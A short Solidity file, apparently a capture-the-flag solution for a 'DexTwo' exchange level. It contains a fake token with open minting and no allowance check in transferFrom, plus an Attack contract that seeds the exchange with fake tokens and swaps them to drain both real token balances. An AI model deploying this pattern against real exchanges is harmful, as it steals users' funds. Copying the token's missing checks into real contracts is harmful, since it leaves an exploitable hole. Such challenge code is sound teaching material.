// SPDX-License-Identifier: MIT
pragma solidity^0.8.2;

interface IDexTwo{
    function swap(address, address, uint)external;
}

interface IERC20{
  function transferFrom(address,address,uint)external returns(bool);
  function mint(uint)external returns(bool);
  function balanceOf(address)external view returns(uint);
}

  contract APtoken is IERC20 {
  mapping (address=> uint) public balanceOf; 
  uint public totalSupply;
    //minting
    function mint(uint mintedAmount)external  returns(bool){
      totalSupply+=mintedAmount;
      balanceOf[msg.sender]+= mintedAmount;
      return true;
    }
    //transfering from owner to receiver
    function transferFrom(address owner, address receiver, uint amount)external  returns(bool){
      require(balanceOf[owner]>=amount,"Not enough tokens");
      balanceOf[owner]-=amount;
      balanceOf[receiver]+=amount;
      return true;
    }
   
}
contract Attack{
    constructor( APtoken ap1,APtoken ap2,IDexTwo dex, address token1, address token2) {
        //minting 2 APtokens1
        ap1.mint(2);
        //transfering one token to DexTwo contract
        // 
        //                             
        //so IERC20(from).balanceOf(DexTwoContract)=1
        ap1.transferFrom(address(this), address(dex),1);
       
        //same thing like for APtoken1
        ap2.mint(2);
        ap2.transferFrom(address(this), address(dex),1);


        //quick math
        //                
        // token1 or token2 (SwappableToken)      ap1 or ap2 (APtoken)
        //        |                                    |        
        //IERC20(to).balanceOf(address(this))/IERC20(from).balanceOf(address(this))
        //                                   _|_
        //                                  \  /
        //                                   \/
        //  amount==1           amount*(100/1) which is 1*100
        //so for one APtoken we get 100 token1s or token2s
        dex.swap(address(ap1), address(token1), 1);
        dex.swap(address(ap2), address(token2), 1);
    }
}